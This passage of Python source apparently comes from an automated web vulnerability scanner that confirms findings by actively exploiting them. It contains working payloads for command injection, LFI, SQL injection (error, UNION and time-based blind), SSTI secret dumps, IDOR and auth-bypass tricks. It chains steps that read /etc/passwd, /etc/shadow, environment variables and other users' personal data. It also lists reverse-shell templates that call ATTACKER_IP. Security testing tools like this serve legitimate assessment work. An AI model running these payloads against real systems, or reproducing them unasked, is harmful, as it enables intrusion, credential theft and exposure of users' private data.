                                        {param: payload} if method.upper() == "POST" else None,
                                    ),
                                }

                            # Special: config leak — look for secrets in response
                            if "config" in payload.lower() and any(k in body.lower() for k in ["secret_key", "database", "password", "api_key"]):
                                secrets = {}
                                for pat in [r"SECRET_KEY['\"]?\s*[:=]\s*['\"]([^'\"]+)", r"PASSWORD['\"]?\s*[:=]\s*['\"]([^'\"]+)"]:
                                    m = re.search(pat, body, re.I)
                                    if m:
                                        secrets[pat.split("[")[0]] = m.group(1)[:30] + "..."

                                if secrets:
                                    return {
                                        "confirmed": True,
                                        "method": "Config/secrets leak via SSTI",
                                        "proof": f"Template config dump exposed application secrets",
                                        "extracted_data": {"secrets_found": secrets, "payload": payload},
                                        "depth": "secret_extraction",
                                        "escalate_to": "critical",
                                        "title_detail": "Secrets Leaked",
                                        "impact_addition": f"SSTI config leak: application secrets extracted via `{payload}`.",
                                        "http_exchange": self._capture_exchange(
                                            resp, method, url, payload, param,
                                            {param: payload} if method.upper() == "POST" else None,
                                        ),
                                    }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Command Injection Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_cmd_injection(self, vuln, base_url: str) -> dict:
        """Confirm command injection by executing unique commands.

        Improvements:
        - Chain exploitation: after confirming `id`, try `cat /etc/passwd`
        - Test file write capability
        - Report potential reverse shell capability
        - Extract maximum system information
        """
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url or not param:
            return {"confirmed": False}

        # Use unique markers to avoid false positives
        import random
        marker = f"PHANTOM_CMD_{random.randint(10000, 99999)}"
        cmd_probes = [
            # Echo with unique marker
            (f"; echo {marker}", marker, "semicolon echo"),
            (f"| echo {marker}", marker, "pipe echo"),
            (f"` echo {marker}`", marker, "backtick echo"),
            (f"$(echo {marker})", marker, "subshell echo"),
            # IFS bypass (WAF evasion)
            (f";echo${{IFS}}{marker}", marker, "IFS bypass echo"),
            (f";echo%09{marker}", marker, "tab bypass echo"),
            # System info extraction
            ("; id", "uid=", "id command"),
            ("| cat /etc/hostname", "", "hostname read"),
            ("; uname -a", "Linux", "uname command"),
            # Newline bypass
            (f"%0aid", "uid=", "newline bypass id"),
            # Windows variants
            ("& echo %USERNAME%", "", "Windows echo"),
            ("| type C:\\Windows\\win.ini", "[fonts]", "Windows file read"),
            ("& whoami", "\\", "Windows whoami"),
        ]

        initial_confirmed = None

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in cmd_probes:
                        try:
                            resp = await self._cmd_send(client, url, param, method, payload)
                            if resp is None:
                                continue

                            body = resp.text

                            if expected and expected in body:
                                # Extract system info from response
                                extracted = {}
                                if "uid=" in body:
                                    uid_match = re.search(r"uid=(\d+)\(([^)]+)\)\s*gid=(\d+)\(([^)]+)\)", body)
                                    if uid_match:
                                        extracted = {
                                            "uid": uid_match.group(1),
                                            "user": uid_match.group(2),
                                            "gid": uid_match.group(3),
                                            "group": uid_match.group(4),
                                        }
                                if "Linux" in body:
                                    uname_match = re.search(r"Linux\s+\S+\s+[\d.\-]+\S*\s+#\d+", body)
                                    if uname_match:
                                        extracted["kernel"] = uname_match.group(0)[:100]

                                initial_confirmed = {
                                    "method": desc,
                                    "payload_prefix": payload[:2],  # ; | ` $
                                    "extracted": extracted,
                                }
                                break
                        except Exception:
                            continue

                    if not initial_confirmed:
                        return {"confirmed": False}

                    # --- Chain exploitation: extract more data ---
                    extracted = dict(initial_confirmed["extracted"])
                    prefix = initial_confirmed["payload_prefix"]
                    chain_cmds = [
                        (f"{prefix} cat /etc/passwd", "passwd file"),
                        (f"{prefix} whoami", "current user"),
                        (f"{prefix} cat /etc/hostname", "hostname"),
                        (f"{prefix} ls -la /", "root listing"),
                        (f"{prefix} env | head -20", "environment"),
                    ]

                    for chain_payload, chain_desc in chain_cmds:
                        try:
                            resp = await self._cmd_send(client, url, param, method, chain_payload)
                            if resp is None:
                                continue
                            body = resp.text

                            if "root:x:" in body:
                                users = re.findall(r"^([^:]+):x:(\d+):", body, re.MULTILINE)
                                extracted["passwd_users"] = [u[0] for u in users[:10]]
                                extracted["passwd_read"] = True
                            elif chain_desc == "current user":
                                # Extract whoami output
                                clean = body.strip()
                                if clean and len(clean) < 100:
                                    extracted["whoami"] = clean[:50]
                            elif chain_desc == "hostname":
                                clean = body.strip()
                                if clean and len(clean) < 100:
                                    extracted["hostname"] = clean[:50]
                            elif "PATH=" in body or "HOME=" in body:
                                env_pairs = re.findall(r"([A-Z_]+)=(.+)", body)
                                extracted["env_vars"] = {k: v[:50] for k, v in env_pairs[:10]}
                        except Exception:
                            continue

                    # --- Test file write capability ---
                    write_marker = f"phantom_write_test_{random.randint(10000, 99999)}"
                    write_payload = f"{prefix} echo {write_marker} > /tmp/phantom_test"
                    can_write = False
                    try:
                        resp = await self._cmd_send(client, url, param, method, write_payload)
                        if resp is not None:
                            # Verify by reading it back
                            read_payload = f"{prefix} cat /tmp/phantom_test"
                            read_resp = await self._cmd_send(client, url, param, method, read_payload)
                            if read_resp and write_marker in read_resp.text:
                                can_write = True
                                extracted["file_write"] = True
                                # Clean up
                                await self._cmd_send(client, url, param, method, f"{prefix} rm /tmp/phantom_test")
                    except Exception:
                        pass

                    # --- Report reverse shell possibility (DO NOT execute) ---
                    reverse_shells = []
                    if extracted.get("user") or extracted.get("whoami"):
                        reverse_shells = [
                            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1",
                            "python -c 'import socket,subprocess;s=socket.socket();s.connect((\"ATTACKER_IP\",4444));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
                            "nc -e /bin/sh ATTACKER_IP 4444",
                        ]

                    impact_parts = [
                        f"Command injection confirmed via `{initial_confirmed['method']}`. Full remote code execution is possible.",
                    ]
                    if extracted.get("passwd_read"):
                        impact_parts.append(f"Read /etc/passwd: {len(extracted.get('passwd_users', []))} users found.")
                    if can_write:
                        impact_parts.append("File write confirmed (can write to /tmp).")
                    if reverse_shells:
                        impact_parts.append(f"Reverse shell payloads available ({len(reverse_shells)} variants).")

                    # Capture HTTP exchange from the initial confirming request
                    cmd_exchange = {}
                    try:
                        # Re-send the initial confirming payload to capture exchange
                        cmd_probes_map = {desc: payload for payload, _, desc in cmd_probes}
                        init_payload = cmd_probes_map.get(initial_confirmed["method"], "")
                        if init_payload:
                            cap_resp = await self._cmd_send(client, url, param, method, init_payload)
                            if cap_resp:
                                cmd_exchange = self._capture_exchange(
                                    cap_resp, method, url, init_payload, param,
                                    {param: init_payload} if method.upper() == "POST" else None,
                                )
                    except Exception:
                        pass

                    return {
                        "confirmed": True,
                        "method": initial_confirmed["method"],
                        "proof": f"Command execution confirmed, chained to extract system info",
                        "extracted_data": {
                            **extracted,
                            "can_write_files": can_write,
                            "reverse_shell_templates": reverse_shells[:2] if reverse_shells else [],
                        },
                        "depth": "full_rce",
                        "escalate_to": "critical",
                        "title_detail": f"Full RCE via {initial_confirmed['method']}" + (" + File Write" if can_write else ""),
                        "impact_addition": "\n".join(impact_parts),
                        "http_exchange": cmd_exchange,
                    }
            except Exception:
                pass

        return {"confirmed": False}

    async def _cmd_send(self, client, url, param, method, payload) -> httpx.Response | None:
        """Send a command injection payload."""
        try:
            if method.upper() == "POST":
                return await client.post(url, data={param: payload})
            else:
                parsed = urlparse(url)
                params = parse_qs(parsed.query, keep_blank_values=True)
                params[param] = [payload]
                new_query = urlencode(params, doseq=True)
                test_url = urlunparse(parsed._replace(query=new_query))
                return await client.get(test_url)
        except Exception:
            return None

    # -----------------------------------------------------------------------
    # LFI / Path Traversal Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_lfi(self, vuln, base_url: str) -> dict:
        """Confirm LFI by reading sensitive files."""
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"

        if not url:
            return {"confirmed": False}

        lfi_targets = [
            ("../../../../etc/passwd", "root:x:", "passwd file"),
            ("....//....//....//etc/passwd", "root:x:", "double-dot passwd"),
            ("..%2f..%2f..%2f..%2fetc/passwd", "root:x:", "encoded passwd"),
            ("/etc/shadow", "root:", "shadow file"),
            ("../../../../etc/hostname", "", "hostname file"),
            ("../../../../proc/self/environ", "PATH=", "process environment"),
            ("../../../../etc/nginx/nginx.conf", "server", "nginx config"),
            ("../../../../var/log/auth.log", "sshd", "auth log"),
            # PHP wrappers
            ("php://filter/convert.base64-encode/resource=/etc/passwd", "cm9vd", "PHP filter passwd"),
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for payload, expected, desc in lfi_targets:
                        try:
                            if param:
                                if method.upper() == "POST":
                                    resp = await client.post(url, data={param: payload})
                                else:
                                    parsed = urlparse(url)
                                    params = parse_qs(parsed.query, keep_blank_values=True)
                                    params[param] = [payload]
                                    new_query = urlencode(params, doseq=True)
                                    test_url = urlunparse(parsed._replace(query=new_query))
                                    resp = await client.get(test_url)
                            else:
                                # Direct URL path (path traversal)
                                resp = await client.get(url)

                            body = resp.text

                            if expected and expected in body:
                                extracted = {}
                                if "root:x:" in body:
                                    users = re.findall(r"^([^:]+):x:(\d+):(\d+):", body, re.MULTILINE)
                                    extracted["users"] = [{"name": u[0], "uid": u[1]} for u in users[:15]]
                                    extracted["file"] = "/etc/passwd"
                                elif "PATH=" in body:
                                    extracted["file"] = "/proc/self/environ"
                                    env_pairs = re.findall(r"([A-Z_]+)=([^\x00]+?)(?:\x00|$)", body)
                                    extracted["environment"] = {k: v[:50] for k, v in env_pairs[:10]}
                                else:
                                    extracted["file"] = desc
                                    extracted["content_preview"] = body[:500]

                                escalate = "critical" if "shadow" in desc or "environ" in desc else None
                                return {
                                    "confirmed": True,
                                    "method": f"LFI via {desc}",
                                    "proof": f"File `{payload}` read successfully, found `{expected}`",
                                    "extracted_data": extracted,
                                    "depth": "file_read",
                                    "escalate_to": escalate,
                                    "title_detail": f"Read {desc}",
                                    "impact_addition": f"LFI confirmed: `{payload}` read sensitive file. Extracted {len(extracted)} data points.",
                                    "http_exchange": self._capture_exchange(
                                        resp, method, url, payload, param,
                                        {param: payload} if param and method.upper() == "POST" else None,
                                    ),
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # IDOR Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_idor(self, vuln, base_url: str) -> dict:
        """Confirm IDOR by accessing multiple users' data."""
        url = vuln.url

        if not url:
            return {"confirmed": False}

        # Try accessing sequential IDs
        parsed = urlparse(url)
        path = parsed.path

        # Find numeric ID in path
        id_match = re.search(r'/(\d+)/?$', path)
        if not id_match:
            return {"confirmed": False}

        original_id = int(id_match.group(1))
        test_ids = [i for i in range(max(1, original_id - 2), original_id + 5) if i != original_id]

        accessed_records = []
        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    for test_id in test_ids[:5]:
                        new_path = path[:id_match.start(1)] + str(test_id) + path[id_match.end(1):]
                        new_url = urlunparse(parsed._replace(path=new_path))
                        try:
                            resp = await client.get(new_url)
                            if resp.status_code == 200:
                                try:
                                    data = resp.json()
                                    # Check if different data than original
                                    data_str = json.dumps(data).lower()
                                    pii = ["email", "password", "phone", "address", "name", "token"]
                                    has_pii = sum(1 for p in pii if p in data_str)
                                    if has_pii >= 1:
                                        # Sanitize before storing
                                        preview = {}
                                        if isinstance(data, dict):
                                            for k, v in list(data.items())[:5]:
                                                preview[k] = str(v)[:50] if v else ""
                                        accessed_records.append({
                                            "id": test_id,
                                            "url": new_url,
                                            "data_preview": preview,
                                            "pii_fields": has_pii,
                                        })
                                except Exception:
                                    continue
                        except Exception:
                            continue
            except Exception:
                pass

        if len(accessed_records) >= 2:
            # Build exchange from the last successful request
            idor_exchange = {}
            try:
                last_rec = accessed_records[-1]
                async with self._http_client(timeout=10.0, follow_redirects=True) as cap_client:
                    cap_resp = await cap_client.get(last_rec["url"])
                    idor_exchange = self._capture_exchange(cap_resp, "GET", last_rec["url"])
            except Exception:
                pass
            return {
                "confirmed": True,
                "method": f"Sequential ID enumeration ({len(accessed_records)} records accessed)",
                "proof": f"Accessed {len(accessed_records)} other users' records via IDOR",
                "extracted_data": {
                    "records_accessed": len(accessed_records),
                    "sample_records": accessed_records[:3],
                },
                "depth": "horizontal_privilege_escalation",
                "escalate_to": "high",
                "title_detail": f"{len(accessed_records)} Users' Data Accessed",
                "impact_addition": f"IDOR confirmed: accessed {len(accessed_records)} different users' records by changing the numeric ID in the URL. Data includes PII fields.",
                "http_exchange": idor_exchange,
            }

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Info Disclosure Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_info_disclosure(self, vuln, base_url: str) -> dict:
        """Confirm info disclosure by extracting and classifying sensitive data."""
        url = vuln.url
        if not url:
            return {"confirmed": False}

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=True) as client:
                    resp = await client.get(url)
                    if resp.status_code != 200:
                        return {"confirmed": False}

                    body = resp.text
                    extracted = self._extract_secrets(body)

                    if extracted:
                        escalate = "critical" if any(
                            k in extracted for k in ["aws_key", "private_key", "password", "api_key"]
                        ) else None
                        return {
                            "confirmed": True,
                            "method": "Secret extraction from exposed file",
                            "proof": f"Extracted {len(extracted)} sensitive items from {url}",
                            "extracted_data": extracted,
                            "depth": "secret_extraction",
                            "escalate_to": escalate,
                            "title_detail": f"{len(extracted)} Secrets Extracted",
                            "impact_addition": f"Sensitive data extracted from exposed endpoint. Found: {', '.join(extracted.keys())}",
                            "http_exchange": self._capture_exchange(resp, "GET", url),
                        }
            except Exception:
                pass

        return {"confirmed": False}

    def _extract_secrets(self, body: str) -> dict:
        """Extract secrets/credentials from response body."""
        secrets = {}
        patterns = {
            "aws_key": r"(?:AKIA|A3T[A-Z0-9])[A-Z0-9]{16,}",
            "private_key": r"-----BEGIN (?:RSA |EC |DSA )?PRIVATE KEY-----",
            "jwt": r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}",
            "github_token": r"gh[ps]_[A-Za-z0-9_]{36,}",
            "stripe_key": r"sk_(?:live|test)_[A-Za-z0-9]{20,}",
            "password": r"(?:password|passwd|pwd)\s*[=:]\s*['\"]?([^\s'\"]{4,30})",
            "api_key": r"(?:api[_-]?key|apikey)\s*[=:]\s*['\"]?([^\s'\"]{8,})",
            "database_url": r"(?:postgres|mysql|mongodb)://[^\s'\"]{10,}",
            "slack_token": r"xox[bpars]-[A-Za-z0-9-]{10,}",
        }
        for name, pattern in patterns.items():
            match = re.search(pattern, body, re.I)
            if match:
                val = match.group(1) if match.lastindex else match.group(0)
                # Truncate for safety
                secrets[name] = val[:40] + "..." if len(val) > 40 else val

        return secrets

    # -----------------------------------------------------------------------
    # Auth Bypass Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_auth_bypass(self, vuln, base_url: str) -> dict:
        """Confirm auth bypass by accessing protected resources.

        Improvements:
        - Scope bypass: access /api/users/OTHER_ID without auth (IDOR+auth_bypass)
        - Method bypass: if GET blocked, try POST/PUT/PATCH/OPTIONS
        - Header bypass: X-Forwarded-For, X-Original-URL, X-Rewrite-URL
        - Path traversal bypass: /admin → blocked, /admin/ → allowed, /Admin, /%61dmin
        """
        url = vuln.url
        if not url:
            return {"confirmed": False}

        # Try to access admin/protected endpoints WITHOUT auth
        protected_paths = [
            "/admin", "/admin/dashboard", "/api/admin/users",
            "/api/users", "/dashboard", "/settings",
            "/api/v1/users", "/manage", "/api/admin",
            "/internal", "/api/internal",
        ]

        accessed = []
        bypass_methods_used = []

        async with self.rate_limit:
            try:
                # Use a client WITHOUT auth cookies
                async with make_client(timeout=10.0) as client:
                    # --- Strategy 1: Direct unauthenticated access ---
                    for path in protected_paths:
                        test_url = f"{base_url}{path}"
                        try:
                            resp = await client.get(test_url, follow_redirects=False)
                            if resp.status_code == 200 and len(resp.text) > 50:
                                body_lower = resp.text[:1000].lower()
                                # Skip SPA fallbacks
                                if "<!doctype html" in body_lower and "__next" in body_lower:
                                    continue
                                accessed.append({
                                    "url": test_url,
                                    "status": resp.status_code,
                                    "content_length": len(resp.text),
                                    "bypass": "direct_access",
                                })
                                bypass_methods_used.append("direct_access")
                        except Exception:
                            continue

                    # --- Strategy 2: Path traversal bypass variants ---
                    path_bypass_variants = [
                        ("{path}/", "trailing slash"),
                        ("{path}/.", "trailing dot"),
                        ("{path}..;/", "path normalization"),
                        ("{path}%20", "space suffix"),
                        ("{path}%09", "tab suffix"),
                        ("{path}?", "empty query string"),
                        ("{path}#", "fragment"),
                        ("{path};", "semicolon"),
                    ]
                    # Case variants
                    for path in ["/admin", "/api/admin"]:
                        case_variants = [
                            path.upper(),                    # /ADMIN
                            path[0] + path[1:].capitalize(), # /Admin
                            "/" + "".join(f"%{ord(c):02x}" if c.isalpha() else c for c in path[1:]),  # /%61dmin
                        ]
                        for variant in case_variants:
                            test_url = f"{base_url}{variant}"
                            try:
                                resp = await client.get(test_url, follow_redirects=False)
                                if resp.status_code == 200 and len(resp.text) > 50:
                                    body_lower = resp.text[:1000].lower()
                                    if "<!doctype html" in body_lower and "__next" in body_lower:
                                        continue
                                    accessed.append({
                                        "url": test_url,
                                        "status": resp.status_code,
                                        "content_length": len(resp.text),
                                        "bypass": f"case_variant:{variant}",
                                    })
                                    bypass_methods_used.append("case_variant")
                            except Exception:
                                continue

                        for tmpl, desc in path_bypass_variants:
                            variant_path = tmpl.format(path=path)
                            test_url = f"{base_url}{variant_path}"
                            try:
                                resp = await client.get(test_url, follow_redirects=False)
                                if resp.status_code == 200 and len(resp.text) > 50:
                                    body_lower = resp.text[:1000].lower()
                                    if "<!doctype html" in body_lower and "__next" in body_lower:
                                        continue
                                    accessed.append({
                                        "url": test_url,
                                        "status": resp.status_code,
                                        "content_length": len(resp.text),
                                        "bypass": f"path_traversal:{desc}",
                                    })
                                    bypass_methods_used.append(f"path_traversal:{desc}")
                            except Exception:
                                continue

                    # --- Strategy 3: HTTP Method bypass ---
                    for path in ["/admin", "/api/admin/users", "/api/users"]:
                        test_url = f"{base_url}{path}"
                        for alt_method in ["POST", "PUT", "PATCH", "OPTIONS", "HEAD"]:
                            try:
                                resp = await client.request(alt_method, test_url, follow_redirects=False)
                                if resp.status_code == 200 and len(resp.text) > 50:
                                    body_lower = resp.text[:1000].lower()
                                    if "<!doctype html" in body_lower and "__next" in body_lower:
                                        continue
                                    accessed.append({
                                        "url": test_url,
                                        "status": resp.status_code,
                                        "content_length": len(resp.text),
                                        "bypass": f"method_bypass:{alt_method}",
                                        "method": alt_method,
                                    })
                                    bypass_methods_used.append(f"method_bypass:{alt_method}")
                            except Exception:
                                continue

                    # --- Strategy 4: Header bypass ---
                    header_bypasses = [
                        {"X-Forwarded-For": "127.0.0.1"},
                        {"X-Original-URL": "/admin"},
                        {"X-Rewrite-URL": "/admin"},
                        {"X-Custom-IP-Authorization": "127.0.0.1"},
                        {"X-Forwarded-Host": "localhost"},
                        {"X-Real-IP": "127.0.0.1"},
                        {"X-Remote-IP": "127.0.0.1"},
                        {"X-Client-IP": "127.0.0.1"},
                        {"X-Host": "127.0.0.1"},
                    ]
                    for path in ["/admin", "/api/admin"]:
                        test_url = f"{base_url}{path}"
                        for bypass_headers in header_bypasses:
                            try:
                                resp = await client.get(test_url, headers=bypass_headers, follow_redirects=False)
                                if resp.status_code == 200 and len(resp.text) > 50:
                                    body_lower = resp.text[:1000].lower()
                                    if "<!doctype html" in body_lower and "__next" in body_lower:
                                        continue
                                    header_name = list(bypass_headers.keys())[0]
                                    accessed.append({
                                        "url": test_url,
                                        "status": resp.status_code,
                                        "content_length": len(resp.text),
                                        "bypass": f"header_bypass:{header_name}",
                                    })
                                    bypass_methods_used.append(f"header_bypass:{header_name}")
                            except Exception:
                                continue

                    # --- Strategy 5: IDOR + Auth Bypass ---
                    # Try accessing other users' data without auth
                    idor_paths = ["/api/users/1", "/api/users/2", "/api/user/1", "/api/user/2",
                                  "/api/v1/users/1", "/api/v1/users/2", "/api/accounts/1"]
                    for path in idor_paths:
                        test_url = f"{base_url}{path}"
                        try:
                            resp = await client.get(test_url, follow_redirects=False)
                            if resp.status_code == 200 and len(resp.text) > 20:
                                try:
                                    data = resp.json()
                                    # Check for user data
                                    data_str = json.dumps(data).lower()
                                    if any(field in data_str for field in ["email", "username", "name", "phone"]):
                                        accessed.append({
                                            "url": test_url,
                                            "status": resp.status_code,
                                            "content_length": len(resp.text),
                                            "bypass": "idor_auth_bypass",
                                            "data_preview": {k: str(v)[:30] for k, v in (data.items() if isinstance(data, dict) else [])},
                                        })
                                        bypass_methods_used.append("idor_auth_bypass")
                                except Exception:
                                    pass
                        except Exception:
                            continue

            except Exception:
                pass

        if accessed:
            unique_bypasses = list(set(bypass_methods_used))
            # Capture exchange from the first bypassed endpoint
            auth_exchange = {}
            try:
                first = accessed[0]
                async with make_client(timeout=10.0) as cap_client:
                    cap_resp = await cap_client.get(first["url"], follow_redirects=False)
                    auth_exchange = self._capture_exchange(cap_resp, first.get("method", "GET"), first["url"])
            except Exception:
                pass
            return {
                "confirmed": True,
                "method": f"Auth bypass via {len(unique_bypasses)} technique(s): {', '.join(unique_bypasses[:5])}",
                "proof": f"Accessed {len(accessed)} protected resources without authentication",
                "extracted_data": {
                    "accessible_endpoints": accessed[:10],
                    "bypass_techniques": unique_bypasses,
                },
                "depth": "auth_bypass",
                "escalate_to": "critical" if any(
                    "/admin" in a["url"] or a.get("bypass") == "idor_auth_bypass" for a in accessed
                ) else "high",
                "title_detail": f"{len(accessed)} Endpoints via {', '.join(unique_bypasses[:3])}",
                "impact_addition": f"Auth bypass confirmed: {len(accessed)} protected endpoints accessible. Bypass techniques: {', '.join(unique_bypasses)}.",
                "http_exchange": auth_exchange,
            }

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # Open Redirect Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_open_redirect(self, vuln, base_url: str) -> dict:
        """Confirm open redirect by following the redirect chain."""
        url = vuln.url
        param = vuln.parameter
        if not url:
            return {"confirmed": False}

        redirect_targets = [
            "https://evil.com",
            "//evil.com",
            "https://evil.com%00.legitimate.com",
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0, follow_redirects=False) as client:
                    for target in redirect_targets:
                        try:
                            if param:
                                parsed = urlparse(url)
                                params = parse_qs(parsed.query, keep_blank_values=True)
                                params[param] = [target]
                                new_query = urlencode(params, doseq=True)
                                test_url = urlunparse(parsed._replace(query=new_query))
                            else:
                                test_url = url

                            resp = await client.get(test_url)
                            if resp.status_code in (301, 302, 307, 308):
                                location = resp.headers.get("location", "")
                                if "evil.com" in location:
                                    return {
                                        "confirmed": True,
                                        "method": f"Redirect to {location}",
                                        "proof": f"Server redirects to attacker-controlled domain: {location}",
                                        "extracted_data": {"redirect_location": location, "payload": target},
                                        "depth": "redirect_confirmed",
                                        "title_detail": "Redirects to External Domain",
                                        "impact_addition": f"Open redirect confirmed: server redirects to `{location}` when given `{target}` as input. Can be used for phishing.",
                                        "http_exchange": self._capture_exchange(resp, "GET", test_url, target, param),
                                    }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # CORS Misconfiguration Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_cors(self, vuln, base_url: str) -> dict:
        """Confirm CORS misconfiguration by testing origin reflection."""
        url = vuln.url or base_url
        if not url:
            return {"confirmed": False}

        test_origins = [
            "https://evil.com",
            "https://attacker.example.com",
            f"https://evil.{urlparse(url).hostname}",
            "null",
        ]

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=10.0) as client:
                    for origin in test_origins:
                        try:
                            headers = {"Origin": origin}
                            resp = await client.get(url, headers=headers)
                            acao = resp.headers.get("access-control-allow-origin", "")
                            acac = resp.headers.get("access-control-allow-credentials", "")

                            if acao == origin or acao == "*":
                                is_critical = acac.lower() == "true" and acao != "*"
                                return {
                                    "confirmed": True,
                                    "method": f"Origin reflection: {origin} → {acao}",
                                    "proof": f"Server reflects arbitrary origin in ACAO header with credentials={acac}",
                                    "extracted_data": {
                                        "tested_origin": origin,
                                        "acao": acao,
                                        "credentials": acac,
                                    },
                                    "depth": "cors_bypass",
                                    "escalate_to": "critical" if is_critical else None,
                                    "title_detail": f"Origin Reflection{' with Credentials' if is_critical else ''}",
                                    "impact_addition": f"CORS misconfiguration confirmed: `Origin: {origin}` reflected in ACAO header. Credentials: {acac}.",
                                    "http_exchange": self._capture_exchange(resp, "GET", url),
                                }
                        except Exception:
                            continue
            except Exception:
                pass

        return {"confirmed": False}

    # -----------------------------------------------------------------------
    # SQLi Confirmation
    # -----------------------------------------------------------------------
    async def _confirm_sqli(self, vuln, base_url: str) -> dict:
        """Confirm SQLi by extracting version, user, database as proof.

        - If UNION works: extract version + user + database
        - If time-based: demonstrate data extraction (first char of DB name)
        - Measure actual exploitability (read data? write files? execute commands?)
        """
        url = vuln.url
        param = vuln.parameter
        method = vuln.method or "GET"
        payload = vuln.payload_used

        if not url or not param:
            return {"confirmed": False}

        async with self.rate_limit:
            try:
                async with self._http_client(timeout=15.0, follow_redirects=True) as client:
                    extracted = {}
                    confirmed_technique = None

                    # --- Strategy 1: Error-based extraction ---
                    error_payloads = [
                        ("1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))-- -", "mysql"),
                        ("1 AND 1=CONVERT(INT,(SELECT @@version))-- -", "mssql"),
                        ("1 AND 1=CAST((SELECT version()) AS INT)-- -", "postgresql"),
                    ]
                    for err_payload, db_type in error_payloads:
                        try:
                            resp = await self._sqli_send(client, url, param, method, err_payload)
                            if resp is None:
                                continue
                            body = resp.text
                            # Look for version string in error
                            version_patterns = [
                                r"~([^~]+)~",
                                r"Duplicate entry '([^']+)'",
                                r"converting.*?value '([^']+)'",
                                r"invalid input syntax.*?\"([^\"]+)\"",
                                r"CAST failed.*?'([^']+)'",
                            ]
                            for pat in version_patterns:
                                m = re.search(pat, body, re.I)
                                if m:
                                    val = m.group(1).strip()
                                    if val and len(val) > 2:
                                        extracted["db_version"] = val
                                        extracted["db_type"] = db_type
                                        confirmed_technique = f"error-based ({db_type})"
                                        break
                            if confirmed_technique:
                                break
                        except Exception:
                            continue

                    # --- Strategy 2: UNION-based extraction ---
                    if not confirmed_technique:
                        for col_count in range(1, 11):
                            nulls = ",".join(["NULL"] * col_count)
                            union_payload = f"-1 UNION SELECT {nulls}-- -"
                            try:
                                resp = await self._sqli_send(client, url, param, method, union_payload)
                                if resp and resp.status_code == 200:
                                    body = resp.text.lower()
                                    if "error" not in body and "different number" not in body:
                                        # Found column count, try extracting data
                                        for i in range(col_count):
                                            cols = ["NULL"] * col_count
                                            cols[i] = "CONCAT('pHnT0m_',@@version,'_pHnT0m')"
                                            extract_payload = f"-1 UNION SELECT {','.join(cols)}-- -"
                                            try:
                                                ext_resp = await self._sqli_send(client, url, param, method, extract_payload)
                                                if ext_resp:
                                                    m = re.search(r"pHnT0m_(.+?)_pHnT0m", ext_resp.text)
                                                    if m:
                                                        extracted["db_version"] = m.group(1)
                                                        extracted["column_count"] = col_count
                                                        extracted["injectable_column"] = i
                                                        confirmed_technique = f"UNION-based ({col_count} columns)"

                                                        # Try user + database
                                                        for expr, key in [("current_user()", "db_user"), ("database()", "db_name")]:
                                                            cols2 = ["NULL"] * col_count
                                                            cols2[i] = f"CONCAT('pHnT0m_',{expr},'_pHnT0m')"
                                                            try:
                                                                r2 = await self._sqli_send(client, url, param, method, f"-1 UNION SELECT {','.join(cols2)}-- -")
                                                                if r2:
                                                                    m2 = re.search(r"pHnT0m_(.+?)_pHnT0m", r2.text)
                                                                    if m2:
                                                                        extracted[key] = m2.group(1)
                                                            except Exception:
                                                                pass
                                                        break
                                            except Exception:
                                                continue
                                        if confirmed_technique:
                                            break
                            except Exception:
                                continue

                    # --- Strategy 3: Time-based blind — extract first char of DB name ---
                    if not confirmed_technique:
                        # Measure baseline
                        import time
                        baseline_start = time.monotonic()
                        await self._sqli_send(client, url, param, method, "1")
                        baseline = time.monotonic() - baseline_start

                        time_payloads = [
                            ("' AND SLEEP(3)-- -", "mysql"),
                            ("'; SELECT pg_sleep(3)-- -", "postgresql"),
                            ("'; WAITFOR DELAY '0:0:3'-- -", "mssql"),
                        ]
                        for time_payload, db_type in time_payloads:
                            try:
                                start = time.monotonic()
                                resp = await self._sqli_send(client, url, param, method, time_payload)
                                elapsed = time.monotonic() - start

                                if resp is not None and (elapsed - baseline) >= 2.5:
                                    confirmed_technique = f"time-based blind ({db_type})"
                                    extracted["db_type"] = db_type
                                    extracted["timing_proof"] = f"{elapsed:.1f}s vs baseline {baseline:.2f}s"

                                    # Try extracting first char of database name
                                    db_name_chars = ""
                                    for pos in range(1, 6):  # First 5 chars only
                                        for char_code in range(32, 127):
                                            extract_payload = f"' AND IF(ASCII(SUBSTRING(database(),{pos},1))={char_code},SLEEP(2),0)-- -"
                                            if db_type == "postgresql":
                                                extract_payload = f"' AND (CASE WHEN ASCII(SUBSTRING(current_database(),{pos},1))={char_code} THEN pg_sleep(2) ELSE pg_sleep(0) END) IS NOT NULL-- -"
                                            try:
                                                e_start = time.monotonic()
                                                e_resp = await self._sqli_send(client, url, param, method, extract_payload)
                                                e_elapsed = time.monotonic() - e_start
                                                if e_resp and (e_elapsed - baseline) >= 1.5:
                                                    db_name_chars += chr(char_code)
                                                    break
                                            except Exception:
                                                continue
                                        else:
                                            break  # No char found at this position

                                    if db_name_chars:
                                        extracted["db_name_partial"] = db_name_chars
